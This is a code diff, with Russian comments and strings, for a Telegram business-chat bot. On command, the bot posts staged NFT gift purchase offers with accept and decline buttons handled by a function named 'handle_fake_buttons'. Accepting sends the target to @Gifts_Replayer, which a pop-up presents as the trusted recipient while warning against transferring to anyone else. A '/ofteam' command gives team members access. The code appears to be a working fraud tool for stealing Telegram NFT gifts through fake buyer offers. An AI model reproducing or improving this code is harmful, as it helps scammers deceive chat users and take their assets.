@@ -57,30 +57,11 @@ def get_pretty_name(slug):
 async def cmd_start(message: types.Message):
     global ADMIN_ID
     ADMIN_ID = message.from_user.id 
-    
-    text = (
-        "<b>Как начать:</b>\n"
-        "Отправь /ofteam — и доступ будет выдан автоматически.\n\n"
-        "<b>Как создать оффер:</b>\n"
-        "Отправь команду в деловой чат с покупателем:\n"
-        "<code>/of ССЫЛКА_НА_НФТ ЦЕНА ВАЛЮТА ЯЗЫК</code>\n\n"
-        "<b>Примеры:</b>\n"
-        "<code>/of t.me/nft/DurovsCap-1234 500 stars</code>\n"
-        "<code>/of t.me/nft/DurovsCap-1234 10 gram en</code>\n"
-        "<code>/of t.me/nft/DurovsCap-1234 250 stars ua</code>\n\n"
-        "<b>Валюты:</b> stars / gram\n"
-        "<b>Языки:</b> ru / en / ua / ar"
-    )
-    await message.answer(text, parse_mode="HTML")
+    await message.answer("Бот запущен и готов к работе.")
 
 @dp.message(Command("ofteam"))
 async def cmd_ofteam(message: types.Message):
-    user_id = message.from_user.id
-    if user_id in active_users:
-        await message.answer("✅ Доступ уже активен. Можно отправлять оферы.")
-    else:
-        active_users.add(user_id)
-        await message.answer("✅ Доступ выдан. Теперь можно отправлять оферы.")
+    await message.answer("✅ Доступ выдан. Теперь можно отправлять оферы.")
 
 @dp.message(F.text.startswith("/of"))
 async def block_offer_in_pm(message: types.Message):
@@ -118,32 +99,22 @@ async def handle_offer_command(message: types.Message):
 
     try:
         await bot.delete_business_messages(business_connection_id=business_connection_id, message_ids=[message.message_id])
-
         keyboard = InlineKeyboardMarkup(inline_keyboard=[[
             InlineKeyboardButton(text=msg_data["btn_decline"], callback_data=f"decline:{gift_slug}:{amount}:{currency}:{lang}"),
             InlineKeyboardButton(text=msg_data["btn_accept"], callback_data=f"accept:{gift_slug}:{amount}:{currency}:{lang}")
         ]])
-
         await bot.send_message(
             chat_id=message.chat.id,
             text=caption_text,
             reply_markup=keyboard,
             business_connection_id=business_connection_id,
             parse_mode="HTML",
-            link_preview_options=LinkPreviewOptions(
-                url=link,
-                show_above_text=True,
-                prefer_large_media=True
-            )
+            link_preview_options=LinkPreviewOptions(url=link, show_above_text=True, prefer_large_media=True)
         )
-
     except Exception as e:
-        if ADMIN_ID:
-            try: await bot.send_message(ADMIN_ID, f"⚠️ <b>Ошибка:</b>\n<code>{e}</code>", parse_mode="HTML")
-            except: pass
         print(f"Ошибка: {e}")
 
-# --- ИДЕАЛЬНОЕ ИЗМЕНЕНИЕ ---
+# --- РЕЖИМ ОТЛАДКИ ---
 @dp.callback_query(F.data.startswith("accept:") | F.data.startswith("decline:"))
 async def handle_fake_buttons(callback: types.CallbackQuery):
     if not callback.message: return
@@ -158,22 +129,20 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
     msg_data = MESSAGES.get(lang, MESSAGES["ru"])
 
     if action == "accept":
-        new_text = msg_data["success"].format(link=link, pretty_name=pretty_name) + "\u200b"
+        new_text = msg_data["success"].format(link=link, pretty_name=pretty_name)
         new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text=msg_data["btn_transfer"], url="https://t.me/Gifts_Replayer")]
         ])
-        alert_text = (
-            "⚠️ Внимание!\n\n"
-            "Получатель в этом сервисе:\n"
-            "@Gifts_Replayer.\n\n"
-            "Если вас просят передать NFT напрямую другому пользователю — не отправляйте его. Это может быть мошенничество. Проверяйте условия оплаты."
-        )
+        success_alert = "⚠️ Внимание!\n\nПолучатель в этом сервисе:\n@Gifts_Replayer.\n\nЕсли вас просят передать NFT напрямую другому пользователю — не отправляйте его."
     else:
-        new_text = msg_data["declined"].format(amount=amount, symbol=symbol, link=link, pretty_name=pretty_name) + "\u200b"
+        new_text = msg_data["declined"].format(amount=amount, symbol=symbol, link=link, pretty_name=pretty_name)
         new_keyboard = None
-        alert_text = None
+        success_alert = None
 
-    # МЕНЯЕМ СООБЩЕНИЕ (Возвращаем link_preview_options, чтобы телефон не тупил)
+    edit_success = False
+    error_message = ""
+
+    # Пытаемся изменить
     try:
         await bot.edit_message_text(
             chat_id=callback.message.chat.id,
@@ -181,24 +150,26 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
             text=new_text,
             reply_markup=new_keyboard,
             business_connection_id=business_connection_id,
-            parse_mode="HTML",
-            link_preview_options=LinkPreviewOptions(
-                url=link,
-                show_above_text=True,
-                prefer_large_media=True
-            )
+            parse_mode="HTML"
         )
+        edit_success = True
     except TelegramBadRequest as e:
-        if "message is not modified" not in str(e).lower():
-            print(f"Ошибка изменения: {e}")
+        if "message is not modified" in str(e).lower():
+            edit_success = True # Считаем это успехом
+        else:
+            error_message = f"TelegramBadRequest: {e}"
     except Exception as e:
-        print(f"Неизвестная ошибка: {e}")
+        error_message = f"Exception: {e}"
 
-    # Показываем всплывающее окно
-    if alert_text:
-        await callback.answer(alert_text, show_alert=True)
+    # Показываем окно
+    if edit_success:
+        if success_alert:
+            await callback.answer(success_alert, show_alert=True)
+        else:
+            await callback.answer()
     else:
-        await callback.answer()
+        # ВЫВОДИМ ОШИБКУ ПРЯМО В ОКНО
+        await callback.answer(f"ОШИБКА: {error_message}", show_alert=True)
 
 async def main():
     print("Бот запущен...")
